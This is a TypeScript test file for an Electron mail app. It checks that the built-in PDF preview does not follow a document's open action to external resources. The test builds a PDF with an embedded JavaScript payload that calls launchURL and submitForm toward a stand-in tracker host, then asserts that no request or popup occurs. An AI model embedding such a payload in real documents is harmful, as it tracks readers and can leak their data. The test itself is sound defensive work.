import {test,expect} from 'bun:test';
import {mkdtemp,writeFile,rm} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import {join,resolve} from 'node:path';
import {spawn} from 'node:child_process';
import {createRequire} from 'node:module';

test('built-in mail PDF preview does not follow document open actions to external resources',async()=>{
 const root=await mkdtemp(join(tmpdir(),'mail-pdf-security-')),appRoot=resolve(import.meta.dir,'..');
 try{
  const {PDFDocument,PDFName,PDFString}=createRequire(join(appRoot,'../server/package.json'))('pdf-lib');
  const document=await PDFDocument.create();document.addPage([300,200]).drawText('Synthetic confidential PDF');
  document.catalog.set(PDFName.of('OpenAction'),document.context.obj({S:PDFName.of('JavaScript'),JS:PDFString.of('app.launchURL("https://tracker.invalid/opened",false);this.submitForm("https://tracker.invalid/submission");')}));
  const data=Buffer.from(await document.save()).toString('base64');
  await writeFile(join(root,'index.html'),'<!doctype html><body><iframe title="Stored PDF"></iframe>');
  const probe=join(root,'probe.cjs');await writeFile(probe,`const {app,BrowserWindow}=require('electron');const assert=require('node:assert/strict');app.setPath('userData',${JSON.stringify(join(root,'profile'))});app.whenReady().then(async()=>{const win=new BrowserWindow({show:false,webPreferences:{sandbox:false,contextIsolation:true,nodeIntegration:false,plugins:true}});const requests=[],popups=[];win.webContents.setWindowOpenHandler(({url})=>{popups.push(url);return{action:'deny'};});win.webContents.session.webRequest.onBeforeRequest({urls:['http://*/*','https://*/*']},(request,callback)=>{requests.push(request.url);callback({cancel:true});});await win.loadFile(${JSON.stringify(join(root,'index.html'))});await win.webContents.executeJavaScript(${JSON.stringify('document.querySelector("iframe").src=URL.createObjectURL(new Blob([Uint8Array.from(atob('+JSON.stringify(data)+'),c=>c.charCodeAt(0))],{type:"application/pdf"}));')});let frames=[];for(let i=0;i<150;i++){frames=win.webContents.mainFrame.framesInSubtree.map(frame=>frame.url);if(frames.some(url=>url.startsWith('chrome-extension://')))break;await new Promise(r=>setTimeout(r,20));}assert(frames.some(url=>url.startsWith('chrome-extension://')),'PDF viewer did not load: '+JSON.stringify(frames));await new Promise(r=>setTimeout(r,500));assert.deepEqual(requests,[]);assert.deepEqual(popups,[]);console.log('MAIL_PDF_SECURITY_PASS');win.destroy();app.quit();}).catch(error=>{console.error(error);app.exit(1)});`);
  const executable=process.env.LEGALWORK_TEST_ELECTRON??createRequire(join(appRoot,'../desktop/package.json'))('electron');
  const result=await new Promise<{code:number|null,output:string}>((done,reject)=>{const child=spawn(executable,[probe],{env:{HOME:process.env.HOME,PATH:process.env.PATH,SystemRoot:process.env.SystemRoot},stdio:['ignore','pipe','pipe']});let output='';const timer=setTimeout(()=>child.kill('SIGKILL'),15000);child.stdout.on('data',data=>output+=data);child.stderr.on('data',data=>output+=data);child.on('error',reject);child.on('close',code=>{clearTimeout(timer);done({code,output});});});if(result.code!==0)throw Error(result.output);expect(result.output).toContain('MAIL_PDF_SECURITY_PASS');
 }finally{await rm(root,{recursive:true,force:true});}
},20000);
